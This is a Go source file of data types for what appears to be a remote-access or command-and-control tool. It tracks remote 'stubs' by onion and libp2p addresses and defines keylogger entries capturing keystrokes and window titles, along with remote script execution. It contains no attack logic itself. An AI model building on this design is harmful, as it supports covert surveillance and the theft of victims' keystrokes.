package common

import "time"

// StubStatus represents the status of a remote stub
type StubStatus struct {
	StubID          string    `json:"stub_id"`
	Hostname        string    `json:"hostname"`
	Platform        string    `json:"platform"`
	Architecture    string    `json:"architecture"`
	OnionAddress    string    `json:"onion_address"`
	LibP2PAddr      string    `json:"libp2p_addr"`
	LastSeen        time.Time `json:"last_seen"`
	IsOnline        bool      `json:"is_online"`
	CPUUsage        float64   `json:"cpu_usage"`
	MemoryUsage     float64   `json:"memory_usage"`
	Temperature     float64   `json:"temperature"`
	Uptime          uint64    `json:"uptime"`
	Version         string    `json:"version"`
	KeyloggerActive bool      `json:"keylogger_active"`
}

// MetricsSnapshot represents a point-in-time metrics snapshot
type MetricsSnapshot struct {
	Timestamp   time.Time `json:"timestamp"`
	CPUPercent  float64   `json:"cpu_percent"`
	MemPercent  float64   `json:"mem_percent"`
	Temperature float64   `json:"temperature"`
	Uptime      uint64    `json:"uptime"`
}

// AnomalyAlert represents an anomaly detection alert
type AnomalyAlert struct {
	StubID       string    `json:"stub_id"`
	AlertType    string    `json:"alert_type"`
	Severity     string    `json:"severity"`
	Message      string    `json:"message"`
	Value        float64   `json:"value"`
	Threshold    float64   `json:"threshold"`
	Timestamp    time.Time `json:"timestamp"`
}

// KeyloggerEntry represents a keylogger entry
type KeyloggerEntry struct {
	Timestamp time.Time `json:"timestamp"`
	Keys      string    `json:"keys"`
	Window    string    `json:"window"`
}

// FileInfo represents file metadata
type FileInfo struct {
	Name    string    `json:"name"`
	Size    int64     `json:"size"`
	Mode    string    `json:"mode"`
	IsDir   bool      `json:"is_dir"`
	ModTime time.Time `json:"mod_time"`
}

// ScriptExecutionRequest represents a script execution request
type ScriptExecutionRequest struct {
	ScriptID string `json:"script_id"`
	Content  string `json:"content"`
	Args     string `json:"args"`
	Timeout  int    `json:"timeout"`
}

// ScriptExecutionResult represents the result of script execution
type ScriptExecutionResult struct {
	ScriptID string `json:"script_id"`
	ExitCode int    `json:"exit_code"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	Duration int    `json:"duration"`
}

// ConfigUpdate represents a bulk configuration update
type ConfigUpdate struct {
	Key       string      `json:"key"`
	Value     interface{} `json:"value"`
	Timestamp time.Time   `json:"timestamp"`
}

// StreamMessage represents a generic stream message
type StreamMessage struct {
	Type    string          `json:"type"`
	Payload interface{}     `json:"payload"`
	Error   string          `json:"error,omitempty"`
}
